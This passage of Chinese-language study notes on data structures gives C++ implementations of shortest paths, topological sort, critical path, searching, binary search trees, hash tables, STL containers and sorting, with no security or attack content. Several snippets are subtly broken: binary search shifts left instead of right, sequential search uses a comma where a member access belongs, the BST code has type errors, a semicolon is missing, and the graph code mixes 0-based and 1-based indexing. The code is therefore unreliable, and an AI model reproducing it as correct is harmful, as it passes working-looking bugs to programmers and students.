      int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1)        &#123;            G.arcs[i][j] &#x3D; w;        &#125;    &#125;&#125;void Dijkstra(Graph &amp;G, char start)&#123;    int v0 &#x3D; LocateVex(G,start);    int n &#x3D; G.vexNum;    vector&lt;int&gt; dist(n + 1, INF);    vector&lt;bool&gt; visited(n + 1, false);    vector&lt;int&gt; path(n + 1, -1);    dist[v0] &#x3D; 0;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        int u &#x3D; -1;        int minDist &#x3D; INF;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            if(!visited[j] &amp;&amp; dist[j] &lt; minDist) &#123;                u &#x3D; j;                minDist &#x3D; dist[j];            &#125;        &#125;        if(u &#x3D;&#x3D; -1) break;        visited[u] &#x3D; true;        for(int v &#x3D; 1; v &lt;&#x3D; n; v++) &#123;            if(!visited[v] &amp;&amp; G.arcs[u][v] !&#x3D; INF) &#123;                if(dist[u] + G.arcs[u][v] &lt; dist[v]) &#123;                    dist[v] &#x3D; dist[u] + G.arcs[u][v];                    path[v] &#x3D; u;  &#x2F;&#x2F; 记录路径                &#125;            &#125;        &#125;    &#125;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        if(i !&#x3D; v0) &#123;            if(dist[i] &#x3D;&#x3D; INF) &#123;                cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;            &#125; else &#123;                cout &lt;&lt; dist[i] &lt;&lt; endl;                cout &lt;&lt; start;                vector&lt;int&gt; route;                int k &#x3D; i;                while(k !&#x3D; -1) &#123;                    route.push_back(k);                    k &#x3D; path[k];                &#125;                for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123;                    cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]];                &#125;                cout &lt;&lt; endl;            &#125;        &#125;    &#125;&#125;int main()&#123;    Graph G;    Create(G);    char start;    cin &gt;&gt; start;    Dijkstra(G, start);    return 0;&#125;</code></pre><p><strong>Floyd</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100#define INF 114154typedef struct&#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v)&#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i)    &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void Create(Graph &amp;G)&#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++)        &#123;            G.arcs[i][j]&#x3D;INF;            if(i&#x3D;&#x3D;j)            &#123;                G.arcs[i][j]&#x3D;0;            &#125;        &#125;    &#125;    for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++)    &#123;        char v1, v2;        int w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1)        &#123;            G.arcs[i][j] &#x3D; w;        &#125;    &#125;&#125;void Floyd(Graph &amp;G)&#123;    int n &#x3D; G.vexNum;    vector&lt;vector&lt;int&gt;&gt; dist(n + 1, vector&lt;int&gt;(n + 1));    vector&lt;vector&lt;int&gt;&gt; path(n + 1, vector&lt;int&gt;(n + 1, -1));    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            dist[i][j] &#x3D; G.arcs[i][j];            if(dist[i][j] &lt; INF &amp;&amp; i !&#x3D; j) &#123;                path[i][j] &#x3D; i;            &#125;        &#125;    &#125;    for(int k &#x3D; 1; k &lt;&#x3D; n; k++) &#123;        for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;            for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;                if(dist[i][k] !&#x3D; INF &amp;&amp; dist[k][j] !&#x3D; INF &amp;&amp;                   dist[i][k] + dist[k][j] &lt; dist[i][j]) &#123;                    dist[i][j] &#x3D; dist[i][k] + dist[k][j];                    path[i][j] &#x3D; path[k][j];                &#125;            &#125;        &#125;    &#125;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            if(i !&#x3D; j) &#123;                cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j];                if(dist[i][j] &#x3D;&#x3D; INF) &#123;                    cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;                &#125; else &#123;                    cout &lt;&lt; dist[i][j] &lt;&lt; endl;                    cout &lt;&lt; G.vexs[i];                    int k &#x3D; path[i][j];                    vector&lt;int&gt; route;                    while(k !&#x3D; -1) &#123;                        route.push_back(k);                        k &#x3D; path[i][k];                    &#125;                    for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123;                        cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]];                    &#125;                    cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[j] &lt;&lt; endl;                &#125;            &#125;        &#125;    &#125;&#125;int main()&#123;    Graph G;    Create(G);    Floyd(G);    return 0;&#125;</code></pre><p><strong>拓扑排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100typedef struct &#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v) &#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void CreateGraph(Graph &amp;G) &#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            G.arcs[i][j] &#x3D; 0;        &#125;    &#125;    for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123;        char v1, v2;        cin &gt;&gt; v1 &gt;&gt; v2;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123;            G.arcs[i][j] &#x3D; 1;  &#x2F;&#x2F; 有向图        &#125;    &#125;&#125;bool TopologicalSort(Graph &amp;G) &#123;    vector&lt;int&gt; inDegree(G.vexNum, 0);    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            if (G.arcs[j][i] &#x3D;&#x3D; 1) &#123;                inDegree[i]++;            &#125;        &#125;    &#125;    queue&lt;int&gt; q;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        if (inDegree[i] &#x3D;&#x3D; 0) &#123;            q.push(i);        &#125;    &#125;    int count &#x3D; 0;    vector&lt;char&gt; result;    while (!q.empty()) &#123;        int v &#x3D; q.front();        q.pop();        result.push_back(G.vexs[v]);        count++;        for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;            if (G.arcs[v][i] &#x3D;&#x3D; 1) &#123;                inDegree[i]--;                if (inDegree[i] &#x3D;&#x3D; 0) &#123;                    q.push(i);                &#125;            &#125;        &#125;    &#125;    if (count &#x3D;&#x3D; G.vexNum) &#123;        for (char c : result) &#123;            cout &lt;&lt; c &lt;&lt; &quot; &quot;;        &#125;        cout &lt;&lt; endl;        return true;    &#125; else &#123;        return false;    &#125;&#125;int main() &#123;    Graph G;    CreateGraph(G);    TopologicalSort(G);    return 0;&#125;</code></pre><p><strong>关键路径</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100#define INF 114154typedef struct &#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v) &#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void CreateGraph(Graph &amp;G) &#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            G.arcs[i][j] &#x3D; 0;        &#125;    &#125;    for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123;        char v1, v2;        int w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123;            G.arcs[i][j] &#x3D; w;        &#125;    &#125;&#125;bool TopologicalSort(Graph &amp;G, vector&lt;int&gt; &amp;topoOrder) &#123;    vector&lt;int&gt; inDegree(G.vexNum, 0);    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            if (G.arcs[j][i] !&#x3D; 0) &#123;                inDegree[i]++;            &#125;        &#125;    &#125;    queue&lt;int&gt; q;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        if (inDegree[i] &#x3D;&#x3D; 0) &#123;            q.push(i);        &#125;    &#125;    while (!q.empty()) &#123;        int v &#x3D; q.front();        q.pop();        topoOrder.push_back(v);        for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;            if (G.arcs[v][i] !&#x3D; 0) &#123;                inDegree[i]--;                if (inDegree[i] &#x3D;&#x3D; 0) &#123;                    q.push(i);                &#125;            &#125;        &#125;    &#125;    return topoOrder.size() &#x3D;&#x3D; G.vexNum;&#125;void CalculateVE(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, vector&lt;int&gt; &amp;ve) &#123;    &#x2F;&#x2F; 初始化ve数组    ve.resize(G.vexNum, 0);    &#x2F;&#x2F; 按拓扑顺序计算ve    for (int i &#x3D; 0; i &lt; topoOrder.size(); i++) &#123;        int u &#x3D; topoOrder[i];        for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123;            if (G.arcs[u][v] !&#x3D; 0) &#123;                ve[v] &#x3D; max(ve[v], ve[u] + G.arcs[u][v]);            &#125;        &#125;    &#125;&#125;void CalculateVL(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, const vector&lt;int&gt; &amp;ve, vector&lt;int&gt; &amp;vl) &#123;    &#x2F;&#x2F; 初始化vl数组    vl.resize(G.vexNum, ve[topoOrder.back()]);    &#x2F;&#x2F; 按逆拓扑顺序计算vl    for (int i &#x3D; topoOrder.size() - 1; i &gt;&#x3D; 0; i--) &#123;        int u &#x3D; topoOrder[i];        for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123;            if (G.arcs[u][v] !&#x3D; 0) &#123;                vl[u] &#x3D; min(vl[u], vl[v] - G.arcs[u][v]);            &#125;        &#125;    &#125;&#125;void FindCriticalPath(Graph &amp;G, const vector&lt;int&gt; &amp;ve, const vector&lt;int&gt; &amp;vl) &#123;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            if (G.arcs[i][j] !&#x3D; 0) &#123;                int e &#x3D; ve[i];  &#x2F;&#x2F; 活动最早开始时间                int l &#x3D; vl[j] - G.arcs[i][j];  &#x2F;&#x2F; 活动最晚开始时间                if (e &#x3D;&#x3D; l) &#123;  &#x2F;&#x2F; 关键活动                    cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j] &lt;&lt; &quot; &quot; &lt;&lt; G.arcs[i][j] &lt;&lt; endl;                &#125;            &#125;        &#125;    &#125;&#125;int main() &#123;    Graph G;    CreateGraph(G);    vector&lt;int&gt; topoOrder;    if (!TopologicalSort(G, topoOrder)) &#123;        cout &lt;&lt; &quot;ERROR&quot; &lt;&lt; endl;        return 0;    &#125;    vector&lt;int&gt; ve, vl;    CalculateVE(G, topoOrder, ve);    CalculateVL(G, topoOrder, ve, vl);    FindCriticalPath(G, ve, vl);    return 0;&#125;</code></pre><h3 id="查找">查找</h3><h4 id="线性表-1">线性表</h4><p><strong>顺序查找</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct&#123;    ElemType *R;    int length;&#125;SSTable;int Search_Seq(SSTable ST,KeyType key)&#123;    for(int i&#x3D;ST.length;i&gt;&#x3D;1;i--)&#123;        if(ST.R[i],key&#x3D;&#x3D;key)&#123;            return i;        &#125;    &#125;    return 0;&#125;</code></pre><p><strong>二分查找</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct&#123;    ElemType *R;    int length;&#125;SSTable;int Search_Bin(SSTable ST,KeyType key)&#123;    int low &#x3D; 1;    int high &#x3D; ST.length;    while(low&lt;&#x3D;high)&#123;        int mid &#x3D; (low+high) &lt;&lt; 1;        if(key&#x3D;&#x3D;ST.R[mid].key)&#123;            return mid;        &#125;        else if(key&lt;ST.R[mid].key)&#123;            high &#x3D; mid - 1;        &#125;        else&#123;            low &#x3D; mid + 1;        &#125;    &#125;    return 0;&#125;</code></pre><p><strong>分块查找</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct&#123;    ElemType *R;    int length;&#125;SSTable;typedef struct &#123;    KeyType max_key; &#x2F;&#x2F; 块内最大关键字    int start;       &#x2F;&#x2F; 块起始位置    int end;         &#x2F;&#x2F; 块结束位置&#125; IndexBlock;int BlockSearch(SSTable ST, IndexBlock index[], int index_len, KeyType key) &#123;    int low &#x3D; 0, high &#x3D; index_len - 1;    int block_idx &#x3D; -1;    &#x2F;&#x2F; 二分查找确定所在块    while (low &lt;&#x3D; high) &#123;        int mid &#x3D; (low + high) &#x2F; 2;        if (key &lt;&#x3D; index[mid].max_key) &#123;            block_idx &#x3D; mid;            high &#x3D; mid - 1;        &#125; else &#123;            low &#x3D; mid + 1;        &#125;    &#125;    if (block_idx &#x3D;&#x3D; -1)        return -1;    &#x2F;&#x2F; 在块内顺序查找    for (int i &#x3D; index[block_idx].start; i &lt;&#x3D; index[block_idx].end; ++i) &#123;        if (ST.R[i].key &#x3D;&#x3D; key)            return i;    &#125;    return -1;&#125;</code></pre><h4 id="树表">树表</h4><p><strong>二叉排序树</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct BSTNode&#123;    ElemType data;    struct BSTNode *lchild,*rchild;&#125;BSTNode,*BSTree;BSTree SearchBST(BSTree T,KeyType key)&#123;    if(!T || key&#x3D;&#x3D;T-&gt;data.key)&#123;        return T;    &#125;    else if(key&lt;T-&gt;data.key)&#123;        return SearchBST(T-&gt;lchild,key);    &#125;    else&#123;        return SearchBST(T-&gt;rchild,key);    &#125;&#125;void InsertBST(BSTree &amp;T,ElemType e)&#123;    if(!T)&#123;        BSTNode S &#x3D; new BSTNode;        S-&gt;data &#x3D; e;        S-&gt;lchild &#x3D; NULL;        S-&gt;rchild &#x3D; NULL;        T &#x3D; S;    &#125;    else if(e.key&lt;T-&gt;data.key)&#123;        InsertBST(T-&gt;lchild,e);    &#125;    else if(e.key&gt;T-&gt;data.key)&#123;        InsertBST(T-&gt;rchild,e);    &#125;&#125;void CreateBST(BSTree &amp;T)&#123;    int e;    T &#x3D; NULL;    cin &gt;&gt; e;    while(e.key!&#x3D;-1)&#123;        InsertBST(T,e);        cin &gt;&gt; e;    &#125;&#125;void DeleteBST(BSTree &amp;T, KeyType key) &#123;    BSTree p &#x3D; T;      &#x2F;&#x2F; 当前节点指针    BSTree f &#x3D; NULL;   &#x2F;&#x2F; 父节点指针    &#x2F;&#x2F; 查找删除节点    while (p) &#123;        if (p-&gt;data.key &#x3D;&#x3D; key) break;        f &#x3D; p;        if (p-&gt;data.key &gt; key) p &#x3D; p-&gt;lchild;        else p &#x3D; p-&gt;rchild;    &#125;    if (!p) return;    BSTree q &#x3D; p;      &#x2F;&#x2F; 辅助指针 q 指向待删除节点    &#x2F;&#x2F; Case 1: 节点 p 是叶子节点或仅有一个子树    if (!p-&gt;lchild) &#123;        &#x2F;&#x2F; 左子树为空，用右子树替换        if (!f) T &#x3D; p-&gt;rchild;              &#x2F;&#x2F; p 是根节点        else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;rchild;        else f-&gt;rchild &#x3D; p-&gt;rchild;        free(q);    &#125; else if (!p-&gt;rchild) &#123; &#x2F;&#x2F; 右子树为空，用左子树替换        if (!f) T &#x3D; p-&gt;lchild;              &#x2F;&#x2F; p 是根节点        else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;lchild;        else f-&gt;rchild &#x3D; p-&gt;lchild;        free(q);    &#125; else &#123;        &#x2F;&#x2F; Case 2: 节点 p 有两个子树，找左子树的最右节点（前驱）        BSTree s &#x3D; p-&gt;lchild;        BSTree parent_s &#x3D; p; &#x2F;&#x2F; s 的父节点        while (s-&gt;rchild) &#123;            parent_s &#x3D; s;            s &#x3D; s-&gt;rchild;        &#125;        &#x2F;&#x2F; 用前驱 s 替换 p 的值        p-&gt;data &#x3D; s-&gt;data;        &#x2F;&#x2F; 删除前驱节点 s（此时 s 至多有一个左子树）        if (parent_s &#x3D;&#x3D; p) parent_s-&gt;lchild &#x3D; s-&gt;lchild;        else parent_s-&gt;rchild &#x3D; s-&gt;lchild;        free(s);    &#125;&#125;</code></pre><h4 id="哈希表">哈希表</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;list&gt;#include &lt;string&gt;using namespace std;&#x2F;&#x2F; 拉链法static const int tableSize &#x3D; 10;vector&lt;list&lt;pair&lt;int, string&gt;&gt;&gt; chainTable(tableSize);int hashFunction(int key)&#123;    return key % tableSize;&#125;void insertChaining(int key, string value)&#123;    int index &#x3D; hashFunction(key);    chainTable[index].push_back(make_pair(key, value));&#125;string searchChaining(int key)&#123;    int index &#x3D; hashFunction(key);    for (auto &amp;p : chainTable[index])    &#123;        if (p.first &#x3D;&#x3D; key)            return p.second;    &#125;    return &quot;&quot;;&#125;void removeChaining(int key)&#123;    int index &#x3D; hashFunction(key);    auto &amp;chain &#x3D; chainTable[index];    for (auto it &#x3D; chain.begin(); it !&#x3D; chain.end(); ++it)    &#123;        if (it-&gt;first &#x3D;&#x3D; key)        &#123;            chain.erase(it);            return;        &#125;    &#125;&#125;&#x2F;&#x2F; 开放定址法（以线性探测为例）enum EntryState &#123; EMPTY, OCCUPIED, DELETED &#125;;struct HashEntry &#123;    int key;    string value;    EntryState state;&#125;;vector&lt;HashEntry&gt; openTable(tableSize, &#123;0, &quot;&quot;, EMPTY&#125;);int hashFunctionLP(int key)&#123;    return key % tableSize;&#125;void insertLinear(int key, string value)&#123;    int idx &#x3D; hashFunctionLP(key);    for (int i &#x3D; 0; i &lt; tableSize; ++i)    &#123;        int probe &#x3D; (idx + i) % tableSize;        if (openTable[probe].state &#x3D;&#x3D; EMPTY || openTable[probe].state &#x3D;&#x3D; DELETED)        &#123;            openTable[probe].key &#x3D; key;            openTable[probe].value &#x3D; value;            openTable[probe].state &#x3D; OCCUPIED;            return;        &#125;    &#125;&#125;string searchLinear(int key)&#123;    int idx &#x3D; hashFunctionLP(key);    for (int i &#x3D; 0; i &lt; tableSize; ++i)    &#123;        int probe &#x3D; (idx + i) % tableSize;        if (openTable[probe].state &#x3D;&#x3D; EMPTY)            return &quot;&quot;;        if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key)            return openTable[probe].value;    &#125;    return &quot;&quot;;&#125;void removeLinear(int key)&#123;    int idx &#x3D; hashFunctionLP(key);    for (int i &#x3D; 0; i &lt; tableSize; ++i)    &#123;        int probe &#x3D; (idx + i) % tableSize;        if (openTable[probe].state &#x3D;&#x3D; EMPTY)            return;        if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key)        &#123;            openTable[probe].state &#x3D; DELETED;            return;        &#125;    &#125;&#125;</code></pre><h4 id="stl-5">STL</h4><p><strong>unordered_set</strong></p><ul><li><code>insert(x)</code> 向集合中插入元素 x（若已存在，则不插入）</li><li><code>erase(x)</code> 从集合中删除元素 x</li><li><code>find(x)</code> 查找元素 x，返回迭代器；若未找到，返回<code>end()</code></li><li><code>count(x)</code> 统计元素 x 在集合中出现的次数（要么 0，要么1）</li><li><code>size()</code> 查询集合中元素数量</li><li><code>empty()</code> 判断集合是否为空</li><li><code>clear()</code> 清空集合中的所有元素</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;unordered_set&gt;using namespace std;int main()&#123;    unordered_set&lt;int&gt; us;    us.insert(3);    us.insert(1);    us.insert(4)    us.insert(1);    cout &lt;&lt; us.size() &lt;&lt; endl;    cout &lt;&lt; (us.find(2) !&#x3D; us.end()) &lt;&lt; endl;    cout &lt;&lt; us.count(1) &lt;&lt; endl;    us.erase(3);    us.clear();    cout &lt;&lt; us.empty() &lt;&lt; endl;&#125;</code></pre><p><strong>unordered_map</strong></p><ul><li><code>insert({k, v})</code> 向映射中插入键值对<code>(k, v)</code>（若键已存在，不插入）</li><li><code>erase(k)</code> 删除键为 k 的元素</li><li><code>find(k)</code> 查找键为 k的元素，返回指向该元素的迭代器；若未找到，返回 <code>end()</code></li><li><code>count(k)</code> 统计键 k 在映射中出现的次数（要么 0，要么1）</li><li><code>operator[](k)</code> 如果键 k存在，返回对应的值；否则插入一个键为k、值为默认构造的元素并返回其引用</li><li><code>size()</code> 查询映射中元素数量</li><li><code>empty()</code> 判断映射是否为空</li><li><code>clear()</code> 清空映射中的所有元素</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;unordered_map&gt;using namespace std;int main()&#123;    unordered_map&lt;string, int&gt; um;    um.insert(&#123;&quot;apple&quot;, 3&#125;);    um.insert(make_pair(&quot;banana&quot;, 5));    um[&quot;cherry&quot;] &#x3D; 2;    cout &lt;&lt; um.size() &lt;&lt; endl;    cout &lt;&lt; um[&quot;cherry&quot;] &lt;&lt; endl;    auto it &#x3D; um.find(&quot;banana&quot;);    if (it !&#x3D; um.end()) &#123;        cout &lt;&lt; it-&gt;second &lt;&lt; endl;    &#125;    um.erase(&quot;apple&quot;);    um.clear();    cout &lt;&lt; um.empty() &lt;&lt; endl;&#125;</code></pre><h3 id="排序">排序</h3><p><strong>插入排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;typedef struct&#123;    int *r;    int length;&#125; SqList;void InsertSort(SqList &amp;L)&#123;    for (int i &#x3D; 1; i &lt; L.length; i++)    &#123;        int temp &#x3D; L.r[i];        int j &#x3D; i - 1;        while (j &gt;&#x3D; 0 &amp;&amp; L.r[j] &gt; temp)        &#123;            L.r[j + 1] &#x3D; L.r[j];            j--;        &#125;        L.r[j + 1] &#x3D; temp;    &#125;&#125;&#x2F;&#x2F; 二分查找插入位置void BinaryInsertSort(SqList &amp;L)&#123;    for (int i &#x3D; 1; i &lt; L.length; i++)    &#123;        int temp &#x3D; L.r[i];        int start &#x3D; 0;        int end &#x3D; i - 1;        while (start &lt;&#x3D; end)        &#123;            int mid &#x3D; (start + end) &#x2F; 2;            if (L.r[mid] &gt; temp)            &#123;                end &#x3D; mid - 1;            &#125;            else            &#123;                start &#x3D; mid + 1;            &#125;        &#125;        for (int j &#x3D; i - 1; j &gt;&#x3D; start; j--)        &#123;            L.r[j + 1] &#x3D; L.r[j];        &#125;        L.r[start] &#x3D; temp;    &#125;&#125;</code></pre><p><strong>希尔排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void ShellSort(Sqlist &amp;L)&#123;    &#x2F;&#x2F; 初始间隔（gap）为长度的一半，逐步缩小间隔直到1    for (int gap &#x3D; L.length &#x2F; 2; gap &gt; 0; gap &#x2F;&#x3D; 2)    &#123;        &#x2F;&#x2F; 对每个子序列进行插入排序        for (int i &#x3D; gap; i &lt; L.length; i++)        &#123;            int temp &#x3D; L.data[i];            int j;            for (j &#x3D; i; j &gt;&#x3D; gap &amp;&amp; L.data[j - gap] &gt; temp; j -&#x3D; gap)            &#123;                L.data[j] &#x3D; L.data[j - gap];            &#125;            L.data[j] &#x3D; temp;        &#125;    &#125;&#125;</code></pre><p><strong>冒泡排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void bubble(Sqlist &amp;L)&#123;    for (int i &#x3D; L.length - 1; i &gt; 0; i--)    &#123;        for (int j &#x3D; 0; j &lt; i; j++)        &#123;            if (L.data[j] &gt; L.data[j + 1])            &#123;                swap(L.data[j], L.data[j + 1]);            &#125;        &#125;    &#125;&#125;</code></pre><p><strong>快速排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;void QuickSort(int a[], int m, int n)&#123;    if (m &gt;&#x3D; n)        return;    int low &#x3D; m;    int high &#x3D; n;    int pivot &#x3D; a[(m + n) &#x2F; 2];    while (low &lt;&#x3D; high)    &#123;        while (a[low] &lt; pivot)            low++;        while (a[high] &gt; pivot)            high--;        if (low &lt;&#x3D; high)        &#123;            swap(a[low], a[high]);            low++;            high--;        &#125;    &#125;    QuickSort(a, m, high);    QuickSort(a, low, n);&#125;</code></pre><p><strong>选择排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void Select(Sqlist &amp;L)&#123;    for (int i &#x3D; 0; i &lt; L.length - 1; i++)    &#123;        int k &#x3D; i;        for (int j &#x3D; i + 1; j &lt; L.length; j++)        &#123;            if (L.data[j] &lt; L.data[k])            &#123;                k &#x3D; j;            &#125;        &#125;        if (k !&#x3D; i)        &#123;            swap(L.data[i], L.data[k]);        &#125;    &#125;&#125;</code></pre><p><strong>堆排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void HeapAdjust(Sqlist &amp;L, int s, int m)&#x2F;&#x2F; s: 待调整的子树根节点下标  m：最后一个元素的下标（调整范围上限）&#123;    int rc &#x3D; L.data[s];    &#x2F;&#x2F; 沿关键字较大的子节点向下筛选    for (int j &#x3D; 2 * s + 1; j &lt;&#x3D; m; j &#x3D; 2 * j + 1) &#x2F;&#x2F; 完全二叉树 左孩子下标2k+1    &#123;        &#x2F;&#x2F; 比较左右孩子，j指向较大的孩子        if (j &lt; m &amp;&amp; L.data[j] &lt; L.data[j + 1])            j &#x3D; j + 1; &#x2F;&#x2F; 右孩子更大，j指向右孩子        &#x2F;&#x2F; 若根节点已比最大孩子大，则调整完成        if (rc &gt;&#x3D; L.data[j])            break;        L.data[s] &#x3D; L.data[j]; &#x2F;&#x2F; 将较大孩子值上移        s &#x3D; j;                 &#x2F;&#x2F; s指向下一层待比较位置    &#125;    L.data[s] &#x3D; rc; &#x2F;&#x2F; 将最初根节点值放入最终位置&#125;void CreateHeap(Sqlist &amp;L)&#123;    &#x2F;&#x2F; 从最后一个非叶子节点开始向前调整    for (int i &#x3D; L.length &#x2F; 2 - 1; i &gt;&#x3D; 0; i--)    &#123;        HeapAdjust(L, i, L.length - 1); &#x2F;&#x2F; 调整以i为根的子树    &#125;&#125;void HeapSort(Sqlist &amp;L)&#123;    CreateHeap(L);    for (int i &#x3D; L.length - 1; i &gt; 0; i--)    &#123;        swap(L.data[0], L.data[i]); &#x2F;&#x2F; 堆顶最大值交换到末尾        HeapAdjust(L, 0, i - 1);    &#x2F;&#x2F; 调整剩余元素为新堆    &#125;&#125;</code></pre><p><strong>归并排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void Merge(Sqlist &amp;L, int low, int mid, int high)&#123;    int *temp &#x3D; new int[high - low + 1];    int i &#x3D; low;     &#x2F;&#x2F; 左半部分起始索引    int j &#x3D; mid + 1; &#x2F;&#x2F; 右半部分起始索引    int k &#x3D; 0;       &#x2F;&#x2F; 临时数组索引    &#x2F;&#x2F; 合并元素到临时数组    while (i &lt;&#x3D; mid &amp;&amp; j &lt;&#x3D; high)    &#123;        